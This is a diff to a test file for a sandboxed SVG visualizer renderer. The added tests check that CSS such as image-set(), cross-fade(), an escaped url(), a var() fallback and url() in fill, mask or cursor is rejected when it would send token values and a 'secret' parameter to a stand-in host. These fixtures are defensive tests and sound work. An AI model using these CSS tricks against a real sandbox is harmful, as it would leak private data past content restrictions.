@@ -92,7 +92,7 @@ describe("renderVisualizerHir", () => {
       render(
         'return <svg style={{ background: "url(https://example.com/" + tokens.length + ")" }} />;',
       ),
-    ).toThrow(/may only reference/u);
+    ).toThrow(/unsupported CSS or an external resource/u);
   });
 
   describe("draws every example visualizer", () => {
@@ -184,6 +184,152 @@ describe("renderVisualizerHir", () => {
       ).toThrow(/cannot be drawn/u);
     },
   );
+
+  describe("refuses a resource computed from tokens and parameters", () => {
+    const privateContext: HirVisualizerContext = {
+      surface: "visualizer",
+      parameters: [{ name: "secret", type: "real" }],
+      elements: [{ name: "x", type: "real" }],
+    };
+    // The placeholders belong to the visualizer source, which interpolates them.
+    const destination =
+      // eslint-disable-next-line no-template-curly-in-string -- see above
+      "https://visualizer-probe.invalid/?token=${token.x}&parameter=${parameters.secret}";
+
+    it.for([
+      {
+        case: "image-set()",
+        style: `background: \`image-set("${destination}" 1x)\``,
+      },
+      {
+        case: "-webkit-image-set() with url()",
+        style: `background: \`-webkit-image-set(url(${destination}) 1x)\``,
+      },
+      {
+        case: "image-set() layered after a gradient",
+        style: `background: \`linear-gradient(red, blue), image-set("${destination}" 1x)\``,
+      },
+      {
+        case: "image()",
+        style: `background: \`image("${destination}")\``,
+      },
+      {
+        case: "cross-fade()",
+        style: `background: \`cross-fade(url(${destination}) 50%, red)\``,
+      },
+      {
+        case: "an escaped url()",
+        style: `background: \`u\\\\72l("${destination}")\``,
+      },
+      {
+        case: "a function name assembled at run time",
+        style: `background: "image" + "-set(" + \`"${destination}" 1x)\``,
+      },
+      {
+        case: "a var() fallback",
+        style: `background: \`var(--missing, url(${destination}))\``,
+      },
+    ])("$case", ({ style }) => {
+      const code = `return <Visualizer.Svg>
+    {tokens.map((token) => <rect key={token.x} style={{ ${style} }} />)}
+  </Visualizer.Svg>;`;
+      const lowered = lowerVisualizerToHir(code, privateContext);
+      expect(
+        lowered.ok ? [] : lowered.diagnostics.map((item) => item.message),
+      ).toEqual([]);
+      if (!lowered.ok) {
+        return;
+      }
+      expect(() =>
+        renderVisualizerHir(
+          lowered.view,
+          [{ x: 731 }],
+          { secret: 42 },
+          { width: 400, height: 240 },
+        ),
+      ).toThrow(
+        /`background` contains unsupported CSS or an external resource/u,
+      );
+    });
+
+    it.for(["fill", "mask", "cursor"])("in %s", (name) => {
+      const attribute =
+        name === "cursor"
+          ? `style={{ cursor: \`url(${destination}) 0 0, auto\` }}`
+          : `${name}={\`url(${destination})\`}`;
+      const code = `return <Visualizer.Svg>
+    {tokens.map((token) => <rect key={token.x} ${attribute} />)}
+  </Visualizer.Svg>;`;
+      const lowered = lowerVisualizerToHir(code, privateContext);
+      expect(lowered.ok).toBe(true);
+      if (!lowered.ok) {
+        return;
+      }
+      expect(() =>
+        renderVisualizerHir(
+          lowered.view,
+          [{ x: 731 }],
+          { secret: 42 },
+          { width: 400, height: 240 },
+        ),
+      ).toThrow(`\`${name}\` contains unsupported CSS or an external resource`);
+    });
+
+    it.each([
+      {
+        root: "Visualizer.Svg",
+        attribute: "backgroundColor={paint}",
+        module: false,
+      },
+      {
+        root: "svg",
+        attribute: "style={{ background: paint }}",
+        module: false,
+      },
+      { root: "svg", attribute: "style={{ background: paint }}", module: true },
+    ])(
+      "validates $root root backgrounds (module: $module)",
+      ({ root, attribute, module }) => {
+        const body = `const paint = \`image-set("${destination.replace("token.x", "tokens[0].x")}" 1x)\`; return <${root} ${attribute} />;`;
+        const code = module
+          ? `export default Visualization(({ tokens, parameters }) => { ${body} });`
+          : body;
+        const lowered = lowerVisualizerToHir(code, privateContext);
+        if (!lowered.ok) throw new Error(JSON.stringify(lowered.diagnostics));
+        expect(() =>
+          renderVisualizerHir(
+            lowered.view,
+            [{ x: 731 }],
+            { secret: 42 },
+            { width: 400, height: 240 },
+          ),
+        ).toThrow(/unsupported CSS or an external resource/u);
+      },
+    );
+  });
+
+  it("draws computed gradients, transforms and fragment references", () => {
+    expect(
+      render(
+        `return <Visualizer.Svg><g transform={\`rotate(\${tokens.length * 10} 5 5)\`}>
+    <rect
+      fill={\`url(#gradient-\${tokens.length})\`}
+      style={{ background: \`linear-gradient(90deg, rgba(0, 0, 0, \${tokens.length / 2}), #fff)\` }}
+    />
+  </g></Visualizer.Svg>;`,
+      ),
+    ).toContain(
+      '<g transform="rotate(10 5 5)"><rect fill="url(#gradient-1)" style="background:linear-gradient(90deg, rgba(0, 0, 0, 0.5), #fff)"></rect></g>',
+    );
+  });
+
+  it("draws computed clipping shapes", () => {
+    expect(
+      render(
+        `return <Visualizer.Svg><rect clipPath={\`circle(\${tokens.length * 10}px)\`} /></Visualizer.Svg>;`,
+      ),
+    ).toContain('<rect clip-path="circle(10px)"></rect>');
+  });
 
   it("leaves a null attribute unset", () => {
     expect(
